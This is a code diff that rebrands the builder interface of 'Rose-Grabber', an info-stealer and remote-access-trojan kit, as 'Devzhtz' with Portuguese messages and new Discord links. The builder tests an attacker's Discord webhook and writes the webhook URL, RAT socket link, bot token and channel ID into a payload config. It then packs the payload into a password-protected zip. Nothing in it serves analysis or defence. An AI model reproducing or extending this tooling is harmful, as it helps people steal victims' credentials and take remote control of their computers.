@@ -28,7 +28,7 @@ pool = ProcessPoolExecutor()
 
 logging.basicConfig(
     level=logging.DEBUG,
-    filename='roselog.log',
+    filename='Devzthz.log',
     filemode='a',
     format='[%(filename)s:%(lineno)d] - %(asctime)s - %(levelname)s - %(message)s'
 )
@@ -37,11 +37,11 @@ logger = logging.getLogger(__name__)
 
 gumbobr0ts_wallet_adr = "MY WALLET ADRESS HERE"
 
-__title__ = 'Rose UI Builder'
-__avatar__ = 'https://raw.githubusercontent.com/DamagingRose/Rose-Grabber/main/components/readme/$rose-b.png'
+__title__ = 'Devzhtz UI Builder'
+__avatar__ = 'https://cdn.discordapp.com/attachments/1155214110364008548/1155214244837597194/Premium_Vector___Red_devil_logo_vector_icon_template.jpg'
 __version__ = '1.9'
 __debugm__ = False # Change only if you are a dev 
-__icon__ = "https://raw.githubusercontent.com/DamagingRose/Rose-Grabber/main/components/readme/$rose-wh.png"
+__icon__ = "https://cdn.discordapp.com/attachments/1155214110364008548/1155214244837597194/Premium_Vector___Red_devil_logo_vector_icon_template.jpg"
 __devmsg__ = requests.get("https://raw.githubusercontent.com/DamagingRose/Rose-Grabber/main/components/roseui/msg.txt").text.splitlines()[0].split(" - ")
 
 data_builder = {
@@ -93,16 +93,11 @@ data_builder = {
 }
 
 links = {
-    "xpierroz_github": "https://github.com/xpierroz",
-    "xpierroz_insta": "https://www.instagram.com/_p.slm/",
-    "gumbobr0t_github": "https://github.com/gumbobr0t",
-    "suegdu_github": "https://github.com/suegdu",
-    "svn_github": "https://github.com/suvan1911",
-    "rose_github": "https://github.com/DamagingRose/Rose-Grabber",
-    "rose_discord": "https://discord.gg/97UeK8PrUY"
+    "Dev_User": "discordapp.com/users/1112514275882307664",
+    "Devzhtz_Discord": "https://discord.gg/VsmErgaTcv"
 }
 
-logger.critical(f"Rose UI Builder is using version {str(__version__)}")
+logger.critical(f"Devzhtz UI Builder is using version {str(__version__)}")
 
 def open_link(key):
     webbrowser.open(links[key])
@@ -112,24 +107,9 @@ def auto_update():
         return 
     
     _code = (
-            "https://raw.githubusercontent.com/DamagingRose/Rose-Grabber/main/components/roseui/builder.py"
+            "https://raw.githubusercontent.com/awijriawfdawd/Devzhtz-Grabber/main/components/roseui/builder.py"
     )
     
-    code = requests.get(_code, timeout=10).text
-    pattern = r"__version__ = '([\d\.]+)'"
-    resultats = re.search(pattern, code)
-    if resultats:
-        version = resultats.group(1)
-        if version != __version__:
-            f = ctypes.windll.user32.MessageBoxW(
-                0, 
-                f"A new version has been detected.\nWould you like to download the new version?\nCurrent version: {str(__version__)} | New version {str(version)}",
-                "Rose-Grabber",
-                4
-            )
-            if f == 6:
-                webbrowser.open("https://github.com/DamagingRose/Rose-Grabber/archive/refs/heads/main.zip")
-                os._exit(0)
 
 def change_data(key, value):
     logger.info("change_data called with key " + key + " and value " + str(value))
@@ -141,24 +121,24 @@ def change_data(key, value):
 async def _test_webhook():
     result = await test_webhook(data_builder["webhook_url"])
     if result == 0:
-        ui.notify("Webhook successfuly executed!", timeout=30, progress=True, avatar=__avatar__, color="green", position="top-left")
+        ui.notify("Webhook executou com sucesso !!", timeout=30, progress=True, avatar=__avatar__, color="green", position="top-left")
         return 
-    ui.notify("Webhook failed to execute!", timeout=30, progress=True, avatar=__avatar__, color="red", position="top-left")
+    ui.notify("Webhook Falhou ao executar !!", timeout=30, progress=True, avatar=__avatar__, color="red", position="top-left")
 
 async def test_webhook(webhook_url):
     try:
         async with Webhook.Async(webhook_url) as hook:
             embed = Embed(
-                description='Webhook is Working',
-                color=11795068,
+                description='Webhook esta funcionando',
+                color=Black,
                 timestamp="now"
             )
-            embed.set_author(name="Success", icon_url=__icon__)
-            embed.set_footer(text="Rose Builder | By pierro, suegdu, gumbobr0t, svn, Minecraft_killer", icon_url=__icon__)
-            await hook.send(embed=embed, username='\x52\x6f\x73\x65\x2d\x47\x72\x61\x62\x62\x65\x72', avatar_url='\x68\x74\x74\x70\x73\x3a\x2f\x2f\x72\x61\x77\x2e\x67\x69\x74\x68\x75\x62\x75\x73\x65\x72\x63\x6f\x6e\x74\x65\x6e\x74\x2e\x63\x6f\x6d\x2f\x44\x61\x6d\x61\x67\x69\x6e\x67\x52\x6f\x73\x65\x2f\x52\x6f\x73\x65\x2d\x47\x72\x61\x62\x62\x65\x72\x2f\x6d\x61\x69\x6e\x2f\x63\x6f\x6d\x70\x6f\x6e\x65\x6e\x74\x73\x2f\x72\x65\x61\x64\x6d\x65\x2f\x25\x32\x34\x72\x6f\x73\x65\x2d\x77\x68\x2e\x70\x6e\x67')
+            embed.set_author(name="Sucesso", icon_url=__icon__)
+            embed.set_footer(text="Devzhtz Builder | BY devzhtz", icon_url=__icon__)
+            await hook.send(embed=embed, username='Devzhtz Scapper Now', avatar_url='https://cdn.discordapp.com/attachments/1155214110364008548/1155214244837597194/Premium_Vector___Red_devil_logo_vector_icon_template.jpg')
         return 0
     except Exception as e:
-        logger.error(f"Webhook failed to execute - Link: {webhook_url} - Error: {e}")
+        logger.error(f"Tentativa falhou - Link: {webhook_url} - Error: {e}")
         return 1
 
 random.seed(0)
@@ -166,8 +146,8 @@ random.seed(0)
 characters = string.ascii_letters + string.digits
 
 gen = ''.join(random.choice(characters) for _ in range(10))
-zip_passw = 'rose123'
-zip_name = f'Rose-Final-{gen}.zip'
+zip_passw = 'devzhtz'
+zip_name = f'devzhtz-Final-{gen}.zip'
 
 def _makebuild(q: Queue, data_builder) -> str:
     logger.info("Entered _makebuild")
@@ -243,8 +223,8 @@ def _makebuild(q: Queue, data_builder) -> str:
             with open(f"{path}\\config.py","r",encoding="utf-8") as f:
                 text = f.read()
                 new = text.replace("WEBHOOK_URL", f"{replace_discord_url(data_builder['webhook_url'])}") \
-                .replace("rose_discord_rat = False", f"rose_discord_rat = {data_builder['rose_rat']}") \
-                .replace("ROSE_DISCORD_RAT_SOCKET_LINK", f"{data_builder['rose_rat_url']}") \
+                .replace("Devzhtz_Discord_rat = False", f"Devzhtz_Discord_rat = {data_builder['rose_rat']}") \
+                .replace("Devzhtz_Discord_RAT_SOCKET_LINK", f"{data_builder['rose_rat_url']}") \
                 .replace("knight_discord_rat = False", f"knight_discord_rat = {data_builder['knight_rat']}") \
                 .replace("KNIGHT_DISCORD_RAT_BOT_TOKEN", f"{data_builder['knight_bot_token']}") \
                 .replace("KNIGHT_DISCORD_RAT_CHANNEL_ID", f"{data_builder['knight_channel_id']}") \
@@ -503,7 +483,7 @@ def _home():
         ui.label(f'If the compilation process completed successfully, you should find the executable file or the zip within the designated folder. In case you encounter any issues, we kindly invite you to join our Discord community for further assistance.\nZIP password: {zip_passw}')
         ui.button('Open Folder', on_click=lambda: os.startfile(os.getcwd()))
         ui.button('Copy password', on_click=lambda: pyperclip.copy(zip_passw))
-        ui.button('Join Discord', on_click=lambda: webbrowser.open(links["rose_discord"]))
+        ui.button('Join Discord', on_click=lambda: webbrowser.open(links["Devzhtz_Discord"]))
         ui.button('Close', on_click=dialog.close)
 
     async def start_computation():
@@ -638,48 +618,27 @@ def _functions():
 def _github():
     with ui.card():
         with ui.row():
-            ui.button("Open Rose Log", on_click=lambda: os.startfile(os.path.join(os.getcwd(), 'roselog.log')))
-            ui.button("Open Rose Compile Log", on_click=lambda: os.startfile(os.path.join(os.getcwd(), 'rosecompile.log')))
+            ui.button("Open Devzhtz Log", on_click=lambda: os.startfile(os.path.join(os.getcwd(), 'roselog.log')))
+            ui.button("Open Devzhtz Compile Log", on_click=lambda: os.startfile(os.path.join(os.getcwd(), 'rosecompile.log')))
         
-        with ui.column():
-            ui.markdown(f"<code>Message from {__devmsg__[0]}: {__devmsg__[1]}</code>")
             with ui.row():
                 with ui.card_section():
-                    ui.label("xpierroz").classes("text-h6")
-                    ui.markdown('<em>- "GUMBO MAKE A FUCKING PR"</em>').classes("text-subtitle5")
+                    ui.label("Devzhtz - Discord").classes("text-h6")
+                    ui.markdown('<em>- "Nickname : contas166"</em>').classes("text-subtitle5")
                     with ui.row():
-                        #ui.label(" ") # Because the button are so sticked together without (sex button) - xpierroz 03/24
-                        ui.button(on_click=lambda: open_link("xpierroz_github")).props("round icon=code color=blue-11")
-                        ui.button(on_click=lambda: open_link("xpierroz_insta")).props("round icon=star_rate color=amber-8")
-
-                with ui.card_section():
-                    ui.label("gumbobr0t").classes("text-h6")
-                    ui.markdown('<em>- "buddy it\'s not my fault"</em>').classes("text-subtitle5")
-                    ui.button(on_click=lambda: open_link("gumbobr0t_github")).props("round icon=code color=blue-11")
-
-            with ui.row():
-                with ui.card_section():
-                    ui.label("suegdu").classes("text-h6")
-                    ui.markdown('<em>- "bruh"</em>').classes("text-subtitle5")
-                    ui.button(on_click=lambda: open_link("suegdu_github")).props("round icon=code color=blue-11")
-
-                with ui.card_section():
-                    ui.label("svn").classes("text-h6")
-                    ui.markdown('<em>*svn died*</em>').classes("text-subtitle5")
-                    ui.button(on_click=lambda: open_link("svn_github")).props("round icon=code color=blue-11")
+                        ui.button(on_click=lambda: open_link("Dev_User")).props("round icon=code color=blue-11")
     with ui.card():
         with ui.card_section():
             with ui.row():
-                ui.label(f"Rose {__version__}").classes("text-h6")
-                ui.button(on_click=lambda: open_link("rose_github")).props("round icon=code color=blue-11")
-                ui.button(on_click=lambda: open_link("rose_discord")).props("round icon=unsubscribe color=indigo-12")
+                ui.label(f"Devzhtz {__version__}").classes("text-h6")
+                ui.button(on_click=lambda: open_link("Devzhtz_Discord")).props("round icon=unsubscribe color=indigo-12")
 
 
 ui.colors(primary='#333')
 
 @ui.page('/home')
 def superhome():
-    ui.image('https://raw.githubusercontent.com/DamagingRose/Rose-Grabber/main/components/readme/%24rose-wh.png').style(
+    ui.image('https://cdn.discordapp.com/attachments/1155214110364008548/1155226717917552712/Premium_Vector___Red_devil_logo__vector_icon_template-removebg-preview.png').style(
         'position: absolute; top: 3px; left: 575px; width: 90px;'
         )    
     with ui.tabs().classes('w-full center') as tabs:
@@ -695,7 +654,7 @@ def superhome():
         with ui.tab_panel('Settings'):
             _github()
 
-v = ui.video('https://github.com/DamagingRose/Rose-Grabber/raw/main/components/assets/RoseLoadingScreen.mp4', autoplay=True, loop=False, muted=True, controls=False).style('position: absolute; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover;')
+v = ui.video('https://cdn.discordapp.com/attachments/1155214110364008548/1155215837662281788/833f572443720b89.mp4', autoplay=True, loop=False, muted=True, controls=False).style('position: absolute; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover;')
 v.on('ended', lambda _: ui.open('/home'))
 app.on_shutdown(pool.shutdown)
 
